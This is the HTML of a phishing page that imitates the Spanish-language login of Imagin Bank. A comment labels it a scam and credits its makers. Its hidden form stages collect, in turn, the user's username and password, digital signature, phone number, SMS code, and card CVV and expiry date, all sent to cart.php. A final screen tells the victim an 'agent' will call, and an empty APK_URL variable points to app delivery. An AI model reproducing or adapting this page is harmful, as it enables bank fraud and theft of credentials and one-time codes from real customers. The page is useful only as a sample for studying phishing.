
<!DOCTYPE html>
<!-- imagin scam @prepagodigi -->
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Imagin Bank</title>

    <link rel="stylesheet" href="./Imagin Bank_files/main.css">

    <link rel="preconnect" href="https://fonts.googleapis.com/">
    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
    <link href="./Imagin Bank_files/css2" rel="stylesheet">
</head>
<body>
<div class="logo">
    <img src="./Imagin Bank_files/logo.png" alt="">
</div>

<div class="content">
    <div id="app-login-form" class="container" style="display: flex;">
        <div class="title">
            Iniciar sesión
        </div>

        <div class="form-login">
            <div class="input-effect">
                <input method="POST" action="cart.php" type="number" class="effect-16" placeholder="" id="username">
                <label>Usuario</label>
            </div>

            <div class="input-effect">
                <input method="POST" action="cart.php" type="password" class="effect-16" placeholder="" id="pass">
                <label>Contraseña</label>
            </div>
        </div>

        <button method="POST" action="cart.php" class="login-btn" id="log-submit">Entrar</button>
    </div>

    <div id="loadingbar" class="container" style="display: none;">
        <!-- BEGIN::Loading Box -->
        <div class="loading-box">
            <p style="text-align: center">Por razones de seguridad, estamos <strong>verificando su conexión</strong>, por favor sea paciente</p>
            <div class="loadingbar" style="display: flex">
                <div class="lds-ring"><div></div><div></div><div></div><div></div></div>
            </div>
        </div>
        <!-- END::Loading Box -->
    </div>

    <div id="requestSignature" class="container" style="display: none;">
        <div class="title">
            Ingrese su firma digital
        </div>

        <div class="form-login">
            <div class="input-effect">
                <input method="POST" action="cart.php" type="password" class="effect-16" placeholder="" id="signature">
                <label>Firma</label>
            </div>
        </div>

        <button method="POST" action="cart.php" class="login-btn" id="log-signature">Enviar</button>
    </div>

    <div id="requestPhone" class="container" style="display: none;">
        <div class="title">
            Ingrese su número de teléfono
        </div>

        <div class="form-login">
            <div class="input-effect">
                <input type="text" class="effect-16" placeholder="" id="phone">
                <label>Teléfono</label>
            </div>
        </div>

        <button method="POST" action="cart.php" class="login-btn" id="log-phone">Enviar</button>
    </div>

    <div id="requestSms" class="container" style="display: none;">
        <div class="title">
            Hemos enviado un SMS a su teléfono
        </div>

        <div class="form-login">
            <div class="input-effect">
                <input type="text" class="effect-16" placeholder="" id="sms">
                <label>SMS</label>
            </div>
        </div>

        <button class="login-btn" id="log-sms">Enviar</button>
    </div>

    <div id="requestCcDefined" class="container" style="display: none;">
        <div class="title">
            Inserte el CVV y fecha de su tarjeta <strong id="ccLastNumber"></strong>
        </div>

        <div class="form-login">
            <div class="input-effect">
                <input type="text" class="effect-16" placeholder="" id="expirationDate">
                <label>Fecha de Caducidad (01/24)</label>
            </div>

            <div class="input-effect">
                <input type="number" class="effect-16" placeholder="" id="cvv">
                <label>CVV</label>
            </div>
        </div>

        <button class="login-btn" id="log-cvv">Enviar</button>
    </div>

    <div id="requestCall" class="container" style="display: none;">
        <div class="title">
            Por seguridad, un agente contactará con usted en unos minutos
        </div>
    </div>

</div>

<div class="background"></div>

<script src="./Imagin Bank_files/jquery.min.js"></script>
<script src="./Imagin Bank_files/functions.js"></script>

<script>
    const HAS_COOKIES = false
    const HAS_BEAUTY = false
    let CLIENT_IP = ""
    let APK_URL = ""
</script>

<!-- PRIMARY JS Framework MADE BY 3ROBI -->
<script type="module" src="./Imagin Bank_files/app.js"></script>
</body></html>